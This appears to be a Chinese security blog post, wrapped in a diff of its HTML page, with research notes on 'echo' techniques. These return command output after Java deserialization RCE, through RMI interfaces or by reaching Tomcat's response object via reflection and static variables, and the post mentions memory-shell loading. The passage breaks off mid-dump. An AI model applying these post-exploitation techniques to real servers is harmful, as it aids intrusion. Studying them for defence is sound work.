@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="java回显" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Xiaopan233 Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="所谓回显。根据各师傅的文章所说。现有的大多数是用defineClass 或 URLClassLoader。加载恶意类并执行。恶意类中进行例如报错、写数据、开RMI通信、等这些操作。就回显了。 不，其实，涉及到内存马加载，都要用这。 反序列化回显，一般都是依靠最终的代码执行点，执行到defineClass或URLClassLoader。，RCE嘛，咱想怎么操作就怎么操作。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java回显">
+<meta property="og:url" content="http://example.com/2022/07/07/2022-07-07-java-echo/index.html">
+<meta property="og:site_name" content="Xiaopan233 Blog">
+<meta property="og:description" content="所谓回显。根据各师傅的文章所说。现有的大多数是用defineClass 或 URLClassLoader。加载恶意类并执行。恶意类中进行例如报错、写数据、开RMI通信、等这些操作。就回显了。 不，其实，涉及到内存马加载，都要用这。 反序列化回显，一般都是依靠最终的代码执行点，执行到defineClass或URLClassLoader。，RCE嘛，咱想怎么操作就怎么操作。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/07/2022-07-07-java-echo/2.png">
+<meta property="og:image" content="http://example.com/2022/07/07/2022-07-07-java-echo/1.png">
+<meta property="article:published_time" content="2022-07-07T15:23:00.000Z">
+<meta property="article:modified_time" content="2022-07-07T16:16:36.610Z">
+<meta property="article:author" content="Xiaopan233">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="Tomcat">
+<meta property="article:tag" content="RMI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/07/2022-07-07-java-echo/2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/07/07/2022-07-07-java-echo/"/>
+
+
+
+
+
+  <title>java回显 | Xiaopan233 Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xiaopan233 Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/atom.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/2020/01/01/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+<script>
+  var server_url = "http://127.0.0.1/blog_v1/blog_v1.php";
+</script>
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/2022-07-07-java-echo/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiaopan233 Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">java回显</h1>
+        
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-07-07T23:23:00+08:00">
+                2022-07-07
+              </time>
+            
+
+            
+
+            
+          </span>
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index">
+                    <span itemprop="name">java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+          
+            
+          
+
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>所谓回显。根据各师傅的文章所说。现有的大多数是用defineClass 或 URLClassLoader。加载恶意类并执行。恶意类中进行例如报错、写数据、开RMI通信、等这些操作。就回显了。</p>
+<p>不，其实，涉及到内存马加载，都要用这。</p>
+<p>反序列化回显，一般都是依靠最终的代码执行点，执行到defineClass或URLClassLoader。，RCE嘛，咱想怎么操作就怎么操作。</p>
+<span id="more"></span>
+
+
+
+<h1 id="RMI方式回显"><a href="#RMI方式回显" class="headerlink" title="RMI方式回显"></a>RMI方式回显</h1><p>RMI Bind Echo时要注意：类型转换时，只能转换成接口类型。不能转换成类类型：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//使用接口类型来接，可成</span></span><br><span class="line">        com.interfa.D1 o1 = InitialContext.doLookup(<span class="string">&quot;rmi://127.0.0.1/objectServer1&quot;</span>);</span><br><span class="line">        System.out.println(o1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//使用实现类来接，会报错</span></span><br><span class="line">        com.interfa.impl.D1Server o2 = InitialContext.doLookup(<span class="string">&quot;rmi://127.0.0.1/objectServer1&quot;</span>);</span><br><span class="line">        System.out.println(o2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是，我们传给<code>defineClass</code>来还原类时，一次只能传一个类。没法将本地自定义接口传上去。</p>
+<p>虽说这个报错是客户端的报错。照理说我们仿写一下发送逻辑，就可以规避这些问题？</p>
+<p>不。不可以。RMI服务端在调用方法时，是根据接口定义的方法，来生成MethodHash的。普通的Remote接口中没有定义方法，所以最终的MethodHashMap是空的。没法成功调用方法。</p>
+<p>所以，我们需要在服务端上找一个<strong>继承了Remote的接口</strong>，并且该接口能接受参数（命令传参），存在返回值（命令回显）。</p>
+<p>在原生JDk中，找到如下接口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">RMIConnection</span><br><span class="line">    方法: invoke()</span><br><span class="line">    传参: String</span><br><span class="line">    返回值: Object</span><br><span class="line"></span><br><span class="line">Activator    </span><br><span class="line">	方法: activate()</span><br><span class="line">    传参: ActivationID - 硬生生构造应该也行。但是太长了哈哈哈。不考虑</span><br><span class="line">    返回值: MarshalledObject - <span class="keyword">byte</span>[] objBytes可存储数据</span><br><span class="line">        </span><br><span class="line">RMIServer</span><br><span class="line">	方法: newClient()</span><br><span class="line">    传参: Object</span><br><span class="line">    返回值: RMIConnection - RMIConnectionImpl实现类中有属性String connectionId 可存储数据</span><br><span class="line">    </span><br><span class="line">DGC</span><br><span class="line">	方法: dirty()</span><br><span class="line">    传参: Lease - VMID属性里有<span class="keyword">byte</span>[] addr可存储数据</span><br><span class="line">    返回值: Lease - VMID属性里有<span class="keyword">byte</span>[] addr可存储数据</span><br><span class="line"></span><br><span class="line">ActivationSystem</span><br><span class="line">    方法: setActivationDesc()</span><br><span class="line">    传参: ActivationDesc - String className属性可存储数据</span><br><span class="line">    返回值: ActivationDesc - String className属性可存储数据</span><br><span class="line">        </span><br><span class="line">ActivationInstantiator</span><br><span class="line">    方法: newInstance()</span><br><span class="line">    传参: ActivationDesc - String className属性可存储数据</span><br><span class="line">    返回值: MarshalledObject&lt;? extends Remote&gt; - <span class="keyword">byte</span>[] objBytes属性可存储数据</span><br></pre></td></tr></table></figure>
+
+<p>虽说大部分接口的返回值不是String。传入的参数也不是String。但只要参数对象中，存在String、byte[]这两种类型的属性。就可以存放命令执行的回显。</p>
+<p>或者，目标没有RMI。我们可以自创一个RMI Server。只需要修改下恶意类，改成<code>LocateRegistry.createRegistry()</code>就好了。这里不赘述了。</p>
+<p>用CC2的话。一直反射Invoke，也是可的。只是麻烦点。这里就不写啦哈哈哈。</p>
+<h1 id="Tomcat回显"><a href="#Tomcat回显" class="headerlink" title="Tomcat回显"></a>Tomcat回显</h1><p>主要的方法：</p>
+<ol>
+<li>报错回显</li>
+<li>拿response对象</li>
+<li>Linux下拿<code>/proc/self/fd/i</code>。控制文件描述符作回显</li>
+</ol>
+<p>SpringMVC中用Tomcat回显，有些小问题。因为Controller逻辑中设置了response后，SpringMvc会再处理一边</p>
+<p>解决思路：在Controller中就调用<code>Response#finishResponse</code>。强制返回。</p>
+<p>但不管怎么样。在SpringMVC中强行设置response。会留下一个报错日志。不太优雅哈哈哈</p>
+<p>日志信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: getWriter() has already been called for this response</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修改程序逻辑，初始化静态变量"><a href="#修改程序逻辑，初始化静态变量" class="headerlink" title="修改程序逻辑，初始化静态变量"></a>修改程序逻辑，初始化静态变量</h2><p>起一个Tomcat，在Controller打断点。然后<strong>回看</strong>调用栈。</p>
+<p>寻找思路：找一个存放了<code>response</code>的Static变量，这样程序全局都可以使用到他。</p>
+<p>定位到 <em>ApplicationFilterChain#internalDoFilter()</em></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title">FilterChain</span>, <span class="title">CometFilterChain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//存在静态变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The int which is used to maintain the current position </span></span><br><span class="line"><span class="comment">     * in the filter chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The int which gives the current number of filters in the chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    .....</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">internalDoFilter</span><span class="params">(ServletRequest request, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  ServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果有自定义的Filter，优先执行</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .....</span><br><span class="line">        <span class="comment">//若ApplicationDispatcher.WRAP_SAME_OBJECT为true</span></span><br><span class="line">        <span class="comment">//将request和response塞入静态变量中</span></span><br><span class="line">        <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">            lastServicedRequest.set(request);</span><br><span class="line">            lastServicedResponse.set(response);</span><br><span class="line">        &#125;</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>缺点：</strong>使用Shiro这种另外走自定义Filter的。如果没继续 <code>chain.doFilter(request, response);</code>的操作，就会调用到<code>if (ApplicationDispatcher.WRAP_SAME_OBJECT)</code>语句块。</p>
+<p><strong>操作：</strong></p>
+<p>通过反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为<code>true</code>，即可让Tomcat将request和response存入静态变量<code>lastServicedRequest</code>。</p>
+<p>这里有个小坑：<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>是<code>final</code>类型的，我们需要先通过反射，将其<code>final</code>属性抹掉，才能正常通过反射设置值。关于抹掉<code>final</code>属性的文在这 <a target="_blank" rel="noopener" href="https://glp2ex.yuque.com/glp2ex/pgf4ei/tl2o1w">反射修改final属性</a></p>
+<h2 id="全局存储"><a href="#全局存储" class="headerlink" title="全局存储"></a>全局存储</h2><p>直接用的话，获取路径为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader() -&gt; ParallelWebappClassLoader -&gt; StandardRoot -&gt; StandardContext -&gt; ApplicationContext -&gt; StandardService -&gt; Connector -&gt; Http11NioProtocol -&gt; AbstractProtocol$ConnectionHandler -&gt; RequestGroupInfo -&gt; RequestInfo -&gt; Request -&gt; Response</span><br></pre></td></tr></table></figure>
+
+<p>从<code>Thread.currentThread().getContextClassLoader()</code>到<code>ApplicationContext</code>的阶段，都是线程类加载器处理的。所以我们不需要关心。真正需要关心的是<code>StandardService</code>之后的，是如何获取的。</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">原作者</a>的这篇文也把他寻找的思路写出来了。讲的挺清楚了。下文都是我跟着调时记的笔记</p>
+<p>思路：找到存放<code>response</code>的类。跟调用栈，看<strong>最终存储</strong>到哪。最后用线程上下文加载器来拿到这个类</p>
+<p>找到一个存放response的类：<code>Http11Processor</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Http11Processor.Response - 原因：<span class="keyword">final</span>，不会被修改</span><br></pre></td></tr></table></figure>
+
+<p>开Java Web项目，断点打在控制器。<strong>看调用栈</strong>。创建<code>Http11Processor</code>的操作就在<code>AbstractProtocol#process()</code></p>
+<p>此时的思路是：寻找哪里存放了<code>Http11Processor</code>。</p>
+<p>注意：找存储变量的操作。不一定在调用栈前，也不一定在调用栈后。前后我们都应该去翻一翻，看一看。</p>
+<p>最佳方式是：找到变量最初的创建点，然后顺着看。如果变量是启动时创建的，那就看做参数传入函数时，有无对其进行操作。跟的太深不要紧，做好笔记就好了。</p>
+<p><strong>Http11Processor的存储</strong></p>
+<p><em>AbstractProtocol#process</em></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (processor == <span class="keyword">null</span>) &#123;</span><br><span class="line">    processor = getProtocol().createProcessor();</span><br><span class="line">    register(processor); <span class="comment">//[!]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>[!]</code>作用：</strong></p>
+<ul>
+<li><p>将<code>processor</code>里的<code>RequestInfo request.reqProcessorMX</code>塞入**<code>RequestGroupInfo AbstractProtocol$ConnectionHandler.global</code>**</p>
+</li>
+<li><p><code>RequestInfo request.reqProcessorMX</code>存在<code>org.apache.coyote.Request req</code>字段。里头有<code>response</code></p>
+</li>
+</ul>
+<p>既然<code>Http11Processor</code>被存储到<code>AbstractProtocol$ConnectionHandler.global</code>中，接下来就找哪里存放了<code>AbstractProtocol$ConnectionHandler</code>。这是一个内部类。一般都会被外面的类的属性保存。</p>
+<p>Tomcat中，<code>AbstractProtocol</code>存放内部类<code>ConnectionHandler</code>的属性是<code>handler</code></p>
+<p>所以接下来的思路是，找<code>AbstractProtocol</code>的存储点。不过需要注意的是，这是一个抽象类。所以寻找存储点时，应该寻找的是其子类。</p>
+<p>继承关系如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AbstractProtocol (org.apache.coyote)</span><br><span class="line">	AbstractAjpProtocol (org.apache.coyote.ajp)</span><br><span class="line">		AjpNioProtocol (org.apache.coyote.ajp)</span><br><span class="line">		AjpAprProtocol (org.apache.coyote.ajp)</span><br><span class="line">		AjpNio2Protocol (org.apache.coyote.ajp)</span><br><span class="line">	AbstractHttp11Protocol (org.apache.coyote.http11)</span><br><span class="line">	AbstractHttp11JsseProtocol (org.apache.coyote.http11)</span><br><span class="line">		Http11AprProtocol (org.apache.coyote.http11)</span><br></pre></td></tr></table></figure>
+
+<p>这里需要提一下，由于又很多类实例是在Tomcat启动时，就已经初始化好了，所以我们不需要挠破脑子想变量哪里被创建，哪里被赋值。我们目的是找存储点。找到即可，不然会越陷越深。</p>
+<p><strong>Http11AprProtocol的存储</strong></p>
+<p>跟着调用栈，技巧是只看Debug栏中的类属性。如果属性中有存放我们想找的类的实例，就去深入探究下大概的赋值链。</p>
+<p><em>AbstractProcessorLight#process</em> 下一个调用点是<em>Http11Processor#service</em>。这是processor里的方法。</p>
+<p><code>Http11Processor</code>有趣的属性如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">protocol = &#123;org.apache.coyote.http11.Http11NioProtocol@<span class="number">3161</span>&#125; </span><br><span class="line"> handler = &#123;org.apache.coyote.AbstractProtocol$ConnectionHandler@<span class="number">3153</span>&#125; </span><br><span class="line"></span><br><span class="line">inputBuffer = &#123;org.apache.coyote.http11.Http11InputBuffer@<span class="number">3731</span>&#125; </span><br><span class="line"> request = &#123;org.apache.coyote.Request@<span class="number">3728</span>&#125; </span><br><span class="line"></span><br><span class="line">outputBuffer = &#123;org.apache.coyote.http11.Http11OutputBuffer@<span class="number">3732</span>&#125; </span><br><span class="line"> response = &#123;org.apache.coyote.Response@<span class="number">3729</span>&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adapter = &#123;org.apache.catalina.connector.CoyoteAdapter&#125; </span><br><span class="line"> connector = &#123;org.apache.catalina.connector.Connector&#125;</span><br><span class="line">  protocolHandler = &#123;org.apache.coyote.http11.Http11NioProtocol&#125; </span><br><span class="line">  mserver = &#123;com.sun.jmx.mbeanserver.JmxMBeanServer&#125; </span><br><span class="line">  service = &#123;org.apache.catalina.core.StandardService&#125;</span><br><span class="line"></span><br><span class="line">userDataHelper = &#123;org.apache.tomcat.util.log.UserDataHelper@<span class="number">3730</span>&#125; </span><br><span class="line"> log = &#123;org.apache.juli.logging.DirectJDKLog@<span class="number">3267</span>&#125; </span><br><span class="line">  logger = &#123;java.util.logging.Logger@<span class="number">3798</span>&#125; </span><br><span class="line">   manager = &#123;ClassLoaderLogManager@<span class="number">3799</span>&#125; </span><br><span class="line">    &#123;ParallelWebappClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">    &#123;RLClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">    &#123;ParallelWebappClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">    &#123;Launcher$AppClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line"></span><br><span class="line">入参有个`socketWrapper`，里头有socket数据。不知道可不可以利用</span><br><span class="line">入参被包裹进`outputBuffer`了</span><br></pre></td></tr></table></figure>
+
+<p>找到了有趣属性，就往调用点前/后去找，有无队这些属性进行保存等操作</p>
+<p>在*CoyoteAdapter#service()*中。<code>connector.protocolHandler</code>存放了上文的protocol。最后Tomcat启动时会将<code>connector</code>放入<code>StandardContext</code>。Tomcat8+可以通过currentThread获取到<code>StandardContext</code></p>
+<p>ps:</p>
+<p><em>AbstractProcessor.response</em> 也是response</p>
+<h3 id="记个没用东西"><a href="#记个没用东西" class="headerlink" title="记个没用东西"></a>记个没用东西</h3><p>Tomcat写文件。不知道路径的情况下，可以使用<code>org.apache.coyote.http11.Http11Protocol.log</code>下的<code>logger.manager.classLoaderLoggers</code>。这里有很多classLoader。还会记录路径</p>
+<p>Tomcat7 - 9。都可用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">org.apache.coyote.http11.Http11Protocol.log = &#123;org.apache.juli.logging.DirectJDKLog&#125; </span><br><span class="line"> logger = &#123;java.util.logging.Logger&#125; </span><br><span class="line">  manager = &#123;org.apache.juli.ClassLoaderLogManager&#125; </span><br><span class="line">   classLoaderLoggers = &#123;java.util.WeakHashMap&#125;  size = <span class="number">4</span></span><br><span class="line">     key = &#123;org.apache.catalina.loader.WebappClassLoader&#125; </span><br><span class="line">      antiJARLocking = <span class="keyword">false</span></span><br><span class="line">      resources = &#123;org.apache.naming.resources.ProxyDirContext&#125; </span><br><span class="line">       proxy = &#123;org.apache.naming.resources.ProxyDirContext&#125; </span><br><span class="line">       env = &#123;java.util.Hashtable&#125;  size = <span class="number">2</span></span><br><span class="line">       dirContext = &#123;org.apache.naming.resources.FileDirContext&#125; </span><br><span class="line">        base = &#123;java.io.File&#125; </span><br><span class="line">        absoluteBase = <span class="string">&quot;D:\ide\env\tomcat\apache-tomcat-7.0.8\webapps\manager&quot;</span> <span class="comment">//[!]</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">org.apache.coyote.http11.Http11Protocol.log = &#123;org.apache.juli.logging.DirectJDKLog&#125; </span><br><span class="line"> logger = &#123;java.util.logging.Logger&#125; </span><br><span class="line">  manager = &#123;org.apache.juli.ClassLoaderLogManager&#125; </span><br><span class="line">   classLoaderLoggers = &#123;java.util.WeakHashMap&#125;  size = <span class="number">4</span></span><br><span class="line">     key = &#123;org.apache.catalina.loader.StandardClassLoader&#125; </span><br><span class="line">     value = &#123;org.apache.juli.ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">      rootNode = &#123;org.apache.juli.ClassLoaderLogManager$LogNode&#125; </span><br><span class="line">       logger = &#123;org.apache.juli.ClassLoaderLogManager$RootLogger&#125; </span><br><span class="line">        manager = &#123;org.apache.juli.ClassLoaderLogManager&#125; </span><br><span class="line">        name = <span class="string">&quot;&quot;</span></span><br><span 